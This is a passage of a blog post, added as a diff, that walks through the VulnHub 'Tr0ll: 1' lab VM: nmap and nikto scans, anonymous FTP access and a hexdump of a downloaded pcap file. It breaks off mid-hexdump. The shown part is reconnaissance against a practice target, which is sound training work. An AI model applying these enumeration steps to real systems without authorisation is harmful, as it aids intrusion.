@@ -1,0 +1,1505 @@
+---
+layout: post
+title: "Tr0ll: 1"
+date: 2019-05-20 20:23:16 +0000
+author: Larry Brown
+category: Walkthroughs
+tags: [vulnhub, vsftpd, pcap, sshpass, kernel exploit, overlayfs, fail2ban]
+---
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/tr0ll-1,100/" target="_blank">https://www.vulnhub.com/entry/tr0ll-1,100/</a></div>
+<div>Hostname: troll</div>
+<div>IP Address: 10.183.0.218</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.218.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# nmap -Pn -sT -sV -A --script=default,banner -oA tr0ll -p- 10.183.0.218</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 22:16 CDT</div>
+    <div>Nmap scan report for troll.homenet.dom (10.183.0.218)</div>
+    <div>Host is up (0.0038s latency).   </div>
+    <div>Not shown: 65532 closed ports   </div>
+    <div>PORT   STATE SERVICE VERSION</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">21/tcp open  ftp     vsftpd 3.0.2</font>
+    </div>
+    <div>|_banner: 220 (<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">vsFTPd 3.0.2</font>)</div>
+    <div>| ftp-anon: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Anonymous FTP login allowed</font> (FTP code 230)</div>
+    <div>|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">lol.pcap</font> [NSE: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">writeable</font>]</div>
+    <div>| ftp-syst: </div>
+    <div>|   STAT: </div>
+    <div>| FTP server status:</div>
+    <div>|      Connected to 10.183.0.222</div>
+    <div>|      Logged in as ftp</div>
+    <div>|      TYPE: ASCII</div>
+    <div>|      No session bandwidth limit</div>
+    <div>|      Session timeout in seconds is 600</div>
+    <div>|      Control connection is plain text</div>
+    <div>|      Data connections will be plain text</div>
+    <div>|      At session startup, client count was 5</div>
+    <div>|      vsFTPd 3.0.2 - secure, fast, stable</div>
+    <div>|_End of status</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</font>
+    </div>
+    <div>|_banner: SSH-2.0-<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH_6.6.1p1</font> Ubuntu-2ubuntu2</div>
+    <div>| ssh-hostkey: </div>
+    <div>|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)</div>
+    <div>|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)</div>
+    <div>|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)</div>
+    <div>|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</font>
+    </div>
+    <div>| http-robots.txt: 1 disallowed entry </div>
+    <div>|_<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">/secret</font>
+    </div>
+    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7</font> (Ubuntu)</div>
+    <div>|_http-title: Site doesn't have a title (text/html).</div>
+    <div>MAC Address: 00:0C:29:39:E9:62 (VMware)</div>
+    <div>Device type: general purpose</div>
+    <div>Running: Linux 3.X|4.X</div>
+    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
+    <div>OS details: Linux 3.2 - 4.9</div>
+    <div>Network Distance: 1 hop</div>
+    <div>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>TRACEROUTE</div>
+    <div>HOP RTT     ADDRESS</div>
+    <div>1   3.80 ms troll.homenet.dom (10.183.0.218)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+    <div>Nmap done: 1 IP address (1 host up) scanned in 31.58 seconds</div>
+</div>
+<div><br /></div>
+<!--more-->
+<div><br /></div>
+<div>
+    <h2>Gaining Access</h2>
+</div>
+<div><br /></div>
+<div>Checking on the service information returned from nmap, we have the following software:</div>
+<ul>
+    <li>
+        <div>vsFTPd 3.0.2 - no known exploits</div>
+    </li>
+    <li>
+        <div>OpenSSH_6.6.1p1 - common username enumeration issues</div>
+    </li>
+    <li>
+        <div>Apache/2.4.7 - a potential code execution issue when paired with PHP 7.0.2</div>
+    </li>
+</ul>
+<div><br /></div>
+<div>The only software issue that might be of interest involves Apache, but it requires a specific version of PHP. Nikto might be able to tell us which version of PHP is in use.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# nikto -h http://10.183.0.218</div>
+    <div>- Nikto v2.1.6</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Target IP:          10.183.0.218</div>
+    <div>+ Target Hostname:    10.183.0.218</div>
+    <div>+ Target Port:        80</div>
+    <div>+ Start Time:         2019-05-19 22:24:57 (GMT-5)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.7</font> (Ubuntu)</div>
+    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
+    <div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div>
+    <div>+ Entry '/secret/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
+    <div>+ "robots.txt" contains 1 entry which should be manually viewed.</div>
+    <div>+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
+    <div>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </div>
+    <div>+ OSVDB-3092: /secret/: This might be interesting...</div>
+    <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
+    <div>+ 7916 requests: 0 error(s) and 9 item(s) reported on remote host</div>
+    <div>+ End Time:           2019-05-19 22:25:36 (GMT-5) (39 seconds)</div>
+    <div>---------------------------------------------------------------------------</div>
+    <div>+ 1 host(s) tested</div>
+</div>
+<div><br /></div>
+<div>Well, we didn't get a PHP version from Nikto. We'll have to do some manual digging to see if we can tell. Before we do that, though, I'd like to check out the FTP service.</div>
+<div><br /></div>
+<div>Nmap already told us quite a bit about it. It allows anonymous access. It has a single readable (and writable) pcap file named lol.pcap. Pcap files can be dangerous to just open, so we'll download it, but handle it with care.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# ftp 10.183.0.218</div>
+    <div>Connected to 10.183.0.218.</div>
+    <div>220 (vsFTPd 3.0.2)</div>
+    <div>Name (10.183.0.218:root): anonymous</div>
+    <div>331 Please specify the password.</div>
+    <div>Password:</div>
+    <div>230 Login successful.</div>
+    <div>Remote system type is UNIX.</div>
+    <div>Using binary mode to transfer files.</div>
+    <div>ftp&gt; ls</div>
+    <div>200 PORT command successful. Consider using PASV.</div>
+    <div>150 Here comes the directory listing.</div>
+    <div>-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap</div>
+    <div>226 Directory send OK.</div>
+    <div>ftp&gt; get lol.pcap lol.pcap</div>
+    <div>local: lol.pcap remote: lol.pcap</div>
+    <div>200 PORT command successful. Consider using PASV.</div>
+    <div>150 Opening BINARY mode data connection for lol.pcap (8068 bytes).</div>
+    <div>226 Transfer complete.</div>
+    <div>8068 bytes received in 0.04 secs (208.9951 kB/s)</div>
+    <div>ftp&gt; put test.txt test.txt</div>
+    <div>local: test.txt remote: test.txt</div>
+    <div>200 PORT command successful. Consider using PASV.</div>
+    <div>550 Permission denied.</div>
+    <div>ftp&gt; quit</div>
+    <div>221 Goodbye.</div>
+</div>
+<div><br /></div>
+<div>We were able to login and download the pcap file. We also tried uploading a test file (just to see if we could). Permission was denied.</div>
+<div><br /></div>
+<div>Using hexdump to view the file contents...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/tr0ll# hexdump -C lol.pcap </div>
+    <div>00000000  0a 0d 0d 0a 6c 00 00 00  4d 3c 2b 1a 01 00 00 00  |....l...M&lt;+.....|</div>
+    <div>00000010  ff ff ff ff ff ff ff ff  03 00 14 00 4c 69 6e 75  |............Linu|</div>
+    <div>00000020  78 20 33 2e 31 32 2d 6b  61 6c 69 31 2d 34 38 36  |x 3.12-kali1-486|</div>
+    <div>00000030  04 00 2f 00 44 75 6d 70  63 61 70 20 31 2e 31 30  |../.Dumpcap 1.10|</div>
+    <div>00000040  2e 32 20 28 53 56 4e 20  52 65 76 20 35 31 39 33  |.2 (SVN Rev 5193|</div>
+    <div>00000050  34 20 66 72 6f 6d 20 2f  74 72 75 6e 6b 2d 31 2e  |4 from /trunk-1.|</div>
+    <div>00000060  31 30 29 00 00 00 00 00  6c 00 00 00 01 00 00 00  |10).....l.......|</div>
+    <div>00000070  54 00 00 00 01 00 00 00  ff ff 00 00 02 00 04 00  |T...............|</div>
+    <div>00000080  65 74 68 30 09 00 01 00  06 00 00 00 0b 00 0e 00  |eth0............|</div>
+    <div>00000090  00 68 6f 73 74 20 31 30  2e 30 2e 30 2e 36 00 00  |.host 10.0.0.6..|</div>
+    <div>000000a0  0c 00 14 00 4c 69 6e 75  78 20 33 2e 31 32 2d 6b  |....Linux 3.12-k|</div>
+    <div>000000b0  61 6c 69 31 2d 34 38 36  00 00 00 00 54 00 00 00  |ali1-486....T...|</div>
+    <div>000000c0  06 00 00 00 6c 00 00 00  00 00 00 00 41 00 05 00  |....l.......A...|</div>
+    <div>000000d0  1b 1b 2c 8b 4a 00 00 00  4a 00 00 00 00 0c 29 20  |..,.J...J.....) |</div>
+    <div>000000e0  70 99 00 0c 29 5d 04 92  08 00 45 00 00 3c c8 14  |p...)]....E..&lt;..|</div>
+    <div>000000f0  40 00 40 06 5e 96 0a 00  00 0c 0a 00 00 06 cc e1  |@.@.^...........|</div>
+    <div>00000100  00 15 62 2c 07 e1 00 00  00 00 a0 02 72 10 ba dc  |..b,........r...|</div>
+    <div>00000110  00 00 02 04 05 b4 04 02  08 0a 00 05 cf f5 00 00  |................|</div>
+    <div>00000120  00 00 01 03 03 0a 00 00  6c 00 00 00 06 00 00 00  |........l.......|</div>
+    <div>00000130  6c 00 00 00 00 00 00 00  41 00 05 00 64 1c 2c 8b  |l.......A...d.,.|</div>
+    <div>00000140  4a 00 00 00 4a 00 00 00  00 0c 29 5d 04 92 00 0c  |J...J.....)]....|</div>
+    <div>00000150  29 20 70 99 08 00 45 00  00 3c 00 00 40 00 40 06  |) p...E..&lt;..@.@.|</div>
+    <div>00000160  26 ab 0a 00 00 06 0a 00  00 0c 00 15 cc e1 9f 75  |&amp;..............u|</div>
+    <div>00000170  8d 20 62 2c 07 e2 a0 12  71 20 db ee 00 00 02 04  |. b,....q ......|</div>
+    <div>00000180  05 b4 04 02 08 0a 00 1a  b3 21 00 05 cf f5 01 03  |.........!......|</div>
+    <div>00000190  03 05 00 00 6c 00 00 00  06 00 00 00 64 00 00 00  |....l.......d...|</div>
+    <div>000001a0  00 00 00 00 41 00 05 00  74 1c 2c 8b 42 00 00 00  |....A...t.,.B...|</div>
+    <div>000001b0  42 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |B.....) p...)]..|</div>
+    <div>000001c0  08 00 45 00 00 34 c8 15  40 00 40 06 5e 9d 0a 00  |..E..4..@.@.^...|</div>
+    <div>000001d0  00 0c 0a 00 00 06 cc e1  00 15 62 2c 07 e2 9f 75  |..........b,...u|</div>
+    <div>000001e0  8d 21 80 10 00 1d 7b bc  00 00 01 01 08 0a 00 05  |.!....{.........|</div>
+    <div>000001f0  cf f5 00 1a b3 21 00 00  64 00 00 00 06 00 00 00  |.....!..d.......|</div>
+    <div>00000200  78 00 00 00 00 00 00 00  41 00 05 00 fb 21 2c 8b  |x.......A....!,.|</div>
+    <div>00000210  56 00 00 00 56 00 00 00  00 0c 29 5d 04 92 00 0c  |V...V.....)]....|</div>
+    <div>00000220  29 20 70 99 08 00 45 00  00 48 3e 00 40 00 40 06  |) p...E..H&gt;.@.@.|</div>
+    <div>00000230  e8 9e 0a 00 00 06 0a 00  00 0c 00 15 cc e1 9f 75  |...............u|</div>
+    <div>00000240  8d 21 62 2c 07 e2 80 18  03 89 1f 24 00 00 01 01  |.!b,.......$....|</div>
+    <div>00000250  08 0a 00 1a b3 22 00 05  cf f5 32 32 30 20 28 76  |....."....220 (v|</div>
+    <div>00000260  73 46 54 50 64 20 33 2e  30 2e 32 29 0d 0a 00 00  |sFTPd 3.0.2)....|</div>
+    <div>00000270  78 00 00 00 06 00 00 00  64 00 00 00 00 00 00 00  |x.......d.......|</div>
+    <div>00000280  41 00 05 00 2e 22 2c 8b  42 00 00 00 42 00 00 00  |A....",.B...B...|</div>
+    <div>00000290  00 0c 29 20 70 99 00 0c  29 5d 04 92 08 00 45 10  |..) p...)]....E.|</div>
+    <div>000002a0  00 34 c8 16 40 00 40 06  5e 8c 0a 00 00 0c 0a 00  |.4..@.@.^.......|</div>
+    <div>000002b0  00 06 cc e1 00 15 62 2c  07 e2 9f 75 8d 35 80 10  |......b,...u.5..|</div>
+    <div>000002c0  00 1d 7b a6 00 00 01 01  08 0a 00 05 cf f6 00 1a  |..{.............|</div>
+    <div>000002d0  b3 22 00 00 64 00 00 00  06 00 00 00 74 00 00 00  |."..d.......t...|</div>
+    <div>000002e0  00 00 00 00 41 00 05 00  27 89 67 8b 52 00 00 00  |....A...'.g.R...|</div>
+    <div>000002f0  52 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |R.....) p...)]..|</div>
+    <div>00000300  08 00 45 10 00 44 c8 17  40 00 40 06 5e 7b 0a 00  |..E..D..@.@.^{..|</div>
+    <div>00000310  00 0c 0a 00 00 06 cc e1  00 15 62 2c 07 e2 9f 75  |..........b,...u|</div>
+    <div>00000320  8d 35 80 18 00 1d ef e4  00 00 01 01 08 0a 00 05  |.5..............|</div>
+    <div>00000330  d3 c3 00 1a b3 22 55 53  45 52 20 61 6e 6f 6e 79  |....."<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">USER anony</font>|</div>
+    <div>00000340  6d 6f 75 73 0d 0a 00 00  74 00 00 00 06 00 00 00  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">mous</font>....t.......|</div>
+    <div>00000350  64 00 00 00 00 00 00 00  41 00 05 00 63 8a 67 8b  |d.......A...c.g.|</div>
+    <div>00000360  42 00 00 00 42 00 00 00  00 0c 29 5d 04 92 00 0c  |B...B.....)]....|</div>
+    <div>00000370  29 20 70 99 08 00 45 00  00 34 3e 01 40 00 40 06  |) p...E..4&gt;.@.@.|</div>
+    <div>00000380  e8 b1 0a 00 00 06 0a 00  00 0c 00 15 cc e1 9f 75  |...............u|</div>
+    <div>00000390  8d 35 62 2c 07 f2 80 10  03 89 70 90 00 00 01 01  |.5b,......p.....|</div>
+    <div>000003a0  08 0a 00 1a b6 ef 00 05  d3 c3 00 00 64 00 00 00  |............d...|</div>
+    <div>000003b0  06 00 00 00 84 00 00 00  00 00 00 00 41 00 05 00  |............A...|</div>
+    <div>000003c0  9f 8a 67 8b 64 00 00 00  64 00 00 00 00 0c 29 5d  |..g.d...d.....)]|</div>
+    <div>000003d0  04 92 00 0c 29 20 70 99  08 00 45 00 00 56 3e 02  |....) p...E..V&gt;.|</div>
+    <div>000003e0  40 00 40 06 e8 8e 0a 00  00 06 0a 00 00 0c 00 15  |@.@.............|</div>
+    <div>000003f0  cc e1 9f 75 8d 35 62 2c  07 f2 80 18 03 89 29 45  |...u.5b,......)E|</div>
+    <div>00000400  00 00 01 01 08 0a 00 1a  b6 ef 00 05 d3 c3 33 33  |..............33|</div>
+    <div>00000410  31 20 50 6c 65 61 73 65  20 73 70 65 63 69 66 79  |1 Please specify|</div>
+    <div>00000420  20 74 68 65 20 70 61 73  73 77 6f 72 64 2e 0d 0a  | the password...|</div>
+    <div>00000430  84 00 00 00 06 00 00 00  64 00 00 00 00 00 00 00  |........d.......|</div>
+    <div>00000440  41 00 05 00 c4 8a 67 8b  42 00 00 00 42 00 00 00  |A.....g.B...B...|</div>
+    <div>00000450  00 0c 29 20 70 99 00 0c  29 5d 04 92 08 00 45 10  |..) p...)]....E.|</div>
+    <div>00000460  00 34 c8 18 40 00 40 06  5e 8a 0a 00 00 0c 0a 00  |.4..@.@.^.......|</div>
+    <div>00000470  00 06 cc e1 00 15 62 2c  07 f2 9f 75 8d 57 80 10  |......b,...u.W..|</div>
+    <div>00000480  00 1d 73 da 00 00 01 01  08 0a 00 05 d3 c3 00 1a  |..s.............|</div>
+    <div>00000490  b6 ef 00 00 64 00 00 00  06 00 00 00 74 00 00 00  |....d.......t...|</div>
+    <div>000004a0  00 00 00 00 41 00 05 00  5c 43 97 8b 51 00 00 00  |....A...\C..Q...|</div>
+    <div>000004b0  51 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |Q.....) p...)]..|</div>
+    <div>000004c0  08 00 45 10 00 43 c8 19  40 00 40 06 5e 7a 0a 00  |..E..C..@.@.^z..|</div>
+    <div>000004d0  00 0c 0a 00 00 06 cc e1  00 15 62 2c 07 f2 9f 75  |..........b,...u|</div>
+    <div>000004e0  8d 57 80 18 00 1d fa 45  00 00 01 01 08 0a 00 05  |.W.....E........|</div>
+    <div>000004f0  d6 d1 00 1a b6 ef 50 41  53 53 20 70 61 73 73 77  |......<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PASS passw</font>|</div>
+    <div>00000500  6f 72 64 0d 0a 00 00 00  74 00 00 00 06 00 00 00  |<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">ord</font>.....t.......|</div>
+    <div>00000510  7c 00 00 00 00 00 00 00  41 00 05 00 ee 47 97 8b  ||.......A....G..|</div>
+    <div>00000520  59 00 00 00 59 00 00 00  00 0c 29 5d 04 92 00 0c  |Y...Y.....)]....|</div>
+    <div>00000530  29 20 70 99 08 00 45 00  00 4b 3e 03 40 00 40 06  |) p...E..K&gt;.@.@.|</div>
+    <div>00000540  e8 98 0a 00 00 06 0a 00  00 0c 00 15 cc e1 9f 75  |...............u|</div>
+    <div>00000550  8d 57 62 2c 08 01 80 18  03 89 88 ab 00 00 01 01  |.Wb,............|</div>
+    <div>00000560  08 0a 00 1a b9 fd 00 05  d6 d1 32 33 30 20 4c 6f  |..........230 Lo|</div>
+    <div>00000570  67 69 6e 20 73 75 63 63  65 73 73 66 75 6c 2e 0d  |gin successful..|</div>
+    <div>00000580  0a 00 00 00 7c 00 00 00  06 00 00 00 64 00 00 00  |....|.......d...|</div>
+    <div>00000590  00 00 00 00 41 00 05 00  22 48 97 8b 42 00 00 00  |....A..."H..B...|</div>
+    <div>000005a0  42 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |B.....) p...)]..|</div>
+    <div>000005b0  08 00 45 10 00 34 c8 1a  40 00 40 06 5e 88 0a 00  |..E..4..@.@.^...|</div>
+    <div>000005c0  00 0c 0a 00 00 06 cc e1  00 15 62 2c 08 01 9f 75  |..........b,...u|</div>
+    <div>000005d0  8d 6e 80 10 00 1d 6d 98  00 00 01 01 08 0a 00 05  |.n....m.........|</div>
+    <div>000005e0  d6 d1 00 1a b9 fd 00 00  64 00 00 00 06 00 00 00  |........d.......|</div>
+    <div>000005f0  68 00 00 00 00 00 00 00  41 00 05 00 73 48 97 8b  |h.......A...sH..|</div>
+    <div>00000600  48 00 00 00 48 00 00 00  00 0c 29 20 70 99 00 0c  |H...H.....) p...|</div>
+    <div>00000610  29 5d 04 92 08 00 45 10  00 3a c8 1b 40 00 40 06  |)]....E..:..@.@.|</div>
+    <div>00000620  5e 81 0a 00 00 0c 0a 00  00 06 cc e1 00 15 62 2c  |^.............b,|</div>
+    <div>00000630  08 01 9f 75 8d 6e 80 18  00 1d b9 d2 00 00 01 01  |...u.n..........|</div>
+    <div>00000640  08 0a 00 05 d6 d1 00 1a  b9 fd 53 59 53 54 0d 0a  |..........SYST..|</div>
+    <div>00000650  68 00 00 00 06 00 00 00  78 00 00 00 00 00 00 00  |h.......x.......|</div>
+    <div>00000660  41 00 05 00 4d 51 97 8b  55 00 00 00 55 00 00 00  |A...MQ..U...U...|</div>
+    <div>00000670  00 0c 29 5d 04 92 00 0c  29 20 70 99 08 00 45 00  |..)]....) p...E.|</div>
+    <div>00000680  00 47 3e 04 40 00 40 06  e8 9b 0a 00 00 06 0a 00  |.G&gt;.@.@.........|</div>
+    <div>00000690  00 0c 00 15 cc e1 9f 75  8d 6e 62 2c 08 07 80 18  |.......u.nb,....|</div>
+    <div>000006a0  03 89 02 bb 00 00 01 01  08 0a 00 1a b9 fd 00 05  |................|</div>
+    <div>000006b0  d6 d1 32 31 35 20 55 4e  49 58 20 54 79 70 65 3a  |..215 UNIX Type:|</div>
+    <div>000006c0  20 4c 38 0d 0a 00 00 00  78 00 00 00 06 00 00 00  | L8.....x.......|</div>
+    <div>000006d0  64 00 00 00 00 00 00 00  41 00 05 00 e6 ef 97 8b  |d.......A.......|</div>
+    <div>000006e0  42 00 00 00 42 00 00 00  00 0c 29 20 70 99 00 0c  |B...B.....) p...|</div>
+    <div>000006f0  29 5d 04 92 08 00 45 10  00 34 c8 1c 40 00 40 06  |)]....E..4..@.@.|</div>
+    <div>00000700  5e 86 0a 00 00 0c 0a 00  00 06 cc e1 00 15 62 2c  |^.............b,|</div>
+    <div>00000710  08 07 9f 75 8d 81 80 10  00 1d 6d 74 00 00 01 01  |...u......mt....|</div>
+    <div>00000720  08 0a 00 05 d6 dc 00 1a  b9 fd 00 00 64 00 00 00  |............d...|</div>
+    <div>00000730  06 00 00 00 7c 00 00 00  00 00 00 00 41 00 05 00  |....|.......A...|</div>
+    <div>00000740  be de c1 8b 5a 00 00 00  5a 00 00 00 00 0c 29 20  |....Z...Z.....) |</div>
+    <div>00000750  70 99 00 0c 29 5d 04 92  08 00 45 10 00 4c c8 1d  |p...)]....E..L..|</div>
+    <div>00000760  40 00 40 06 5e 6d 0a 00  00 0c 0a 00 00 06 cc e1  |@.@.^m..........|</div>
+    <div>00000770  00 15 62 2c 08 07 9f 75  8d 81 80 18 00 1d 10 42  |..b,...u.......B|</div>
+    <div>00000780  00 00 01 01 08 0a 00 05  d9 8b 00 1a b9 fd 50 4f  |..............PO|</div>
+    <div>00000790  52 54 20 31 30 2c 30 2c  30 2c 31 32 2c 31 37 33  |RT 10,0,0,12,173|</div>
+    <div>000007a0  2c 31 39 38 0d 0a 00 00  7c 00 00 00 06 00 00 00  |,198....|.......|</div>
+    <div>000007b0  98 00 00 00 00 00 00 00  41 00 05 00 3a e0 c1 8b  |........A...:...|</div>
+    <div>000007c0  75 00 00 00 75 00 00 00  00 0c 29 5d 04 92 00 0c  |u...u.....)]....|</div>
+    <div>000007d0  29 20 70 99 08 00 45 00  00 67 3e 05 40 00 40 06  |) p...E..g&gt;.@.@.|</div>
+    <div>000007e0  e8 7a 0a 00 00 06 0a 00  00 0c 00 15 cc e1 9f 75  |.z.............u|</div>
+    <div>000007f0  8d 81 62 2c 08 1f 80 18  03 89 b9 26 00 00 01 01  |..b,.......&amp;....|</div>
+    <div>00000800  08 0a 00 1a bc b7 00 05  d9 8b 32 30 30 20 50 4f  |..........200 PO|</div>
+    <div>00000810  52 54 20 63 6f 6d 6d 61  6e 64 20 73 75 63 63 65  |RT command succe|</div>
+    <div>00000820  73 73 66 75 6c 2e 20 43  6f 6e 73 69 64 65 72 20  |ssful. Consider |</div>
+    <div>00000830  75 73 69 6e 67 20 50 41  53 56 2e 0d 0a 00 00 00  |using PASV......|</div>
+    <div>00000840  98 00 00 00 06 00 00 00  64 00 00 00 00 00 00 00  |........d.......|</div>
+    <div>00000850  41 00 05 00 69 e0 c1 8b  42 00 00 00 42 00 00 00  |A...i...B...B...|</div>
+    <div>00000860  00 0c 29 20 70 99 00 0c  29 5d 04 92 08 00 45 10  |..) p...)]....E.|</div>
+    <div>00000870  00 34 c8 1e 40 00 40 06  5e 84 0a 00 00 0c 0a 00  |.4..@.@.^.......|</div>
+    <div>00000880  00 06 cc e1 00 15 62 2c  08 1f 9f 75 8d b4 80 10  |......b,...u....|</div>
+    <div>00000890  00 1d 67 c0 00 00 01 01  08 0a 00 05 d9 8b 00 1a  |..g.............|</div>
+    <div>000008a0  bc b7 00 00 64 00 00 00  06 00 00 00 68 00 00 00  |....d.......h...|</div>
+    <div>000008b0  00 00 00 00 41 00 05 00  b5 e0 c1 8b 48 00 00 00  |....A.......H...|</div>
+    <div>000008c0  48 00 00 00 00 0c 29 20  70 99 00 0c 29 5d 04 92  |H.....) p...)]..|</div>
+    <div>000008d0  08 00 45 10 00 3a c8 1f  40 00 40 06 5e 7d 0a 00  |..E..:..@.@.^}..|</div>
+    <div>000008e0  00 0c 0a 00 00 06 cc e1  00 15 62 2c 08 1f 9f 75  |..........b,...u|</div>
+    <div>000008f0  8d b4 80 18 00 1d bb 0a  00 00 01 01 08 0a 00 05  |................|</div>
+    <div>00000900  d9 8b 00 1a bc b7 4c 49  53 54 0d 0a 68 00 00 00  |......LIST..h...|</div>
+    <div>00000910  06 00 00 00 6c 00 00 00  00 00 00 00 41 00 05 00  |....l.......A...|</div>
+    <div>00000920  a7 e1 c1 8b 4a 00 00 00  4a 00 00 00 00 0c 29 5d  |....J...J.....)]|</div>
+    <div>00000930  04 92 00 0c 29 20 70 99  08 00 45 00 00 3c 1d b3  |....) p...E..&lt;..|</div>
+    <div>00000940  40 00 40 06 08 f8 0a 00  00 06 0a 00 00 0c 00 14  |@.@.............|</div>
+    <div>00000950  ad c6 3a 0e a1 04 00 00  00 00 a0 02 72 10 7c 21  |..:.........r.|!|</div>
+    <div>00000960  00 00 02 04 05 b4 04 02  08 0a 00 1a bc b7 00 00  |................|</div>
+    <div>00000970  00 00 01 03 03 05 00 00  6c 00 00 00 06 00 00 00  |........l.......|</div>
+    <div>00000980  6c 00 00 00 00 00 00 00  41 00 05 00 b6 e1 c1 8b  |l.......A.......|</div>
+    <div>00000990  4a 00 00 00 4a 00 00 00  00 0c 29 20 70 99 00 0c  |J...J.....) p...|</div>
+    <div>000009a0  29 5d 04 92 08 00 45 00  00 3c 00 00 40 00 40 06  |)]....E..&lt;..@.@.|</div>
+    <div>000009b0  26 ab 0a 00 00 0c 0a 00  00 06 ad c6 00 14 05 0e  |&amp;...............|</div>
+    <div>000009c0  04 92 3a 0e a1 05 a0 12  71 20 99 ca 00 00 02 04  |..:.....q ......|</div>
+    <div>000009d0  05 b4 04 02 08 0a 00 05  d9 8b 00 1a bc b7 01 03  |................|</div>
+    <div>000009e0  03 0a 00 00 6c 00 00 00  06 00 00 00 64 00 00 00  |....l.......d...|</div>
+    <div>000009f0  00 00 00 00 41 00 05 00  2d e2 c1 8b 42 00 00 00  |....A...-...B...|</div>
+    <div>00000a00  42 00 00 00 00 0c 29 5d  04 92 00 0c 29 20 70 99  |B.....)]....) p.|</div>
+    <div>00000a10  08 00 45 00 00 34 1d b4  40 00 40 06 08 ff 0a 00  |..E..4..@.@.....|</div>
+    <div>00000a20  00 06 0a 00 00 0c 00 14  ad c6 3a 0e a1 05 05 0e  |..........:.....|</div>
+    <div>00000a30  04 93 80 10 03 91 36 29  00 00 01 01 08 0a 00 1a  |......6)........|</div>
+    <div>00000a40  bc b7 00 05 d9 8b 00 00  64 00 00 00 06 00 00 00  |........d.......|</div>
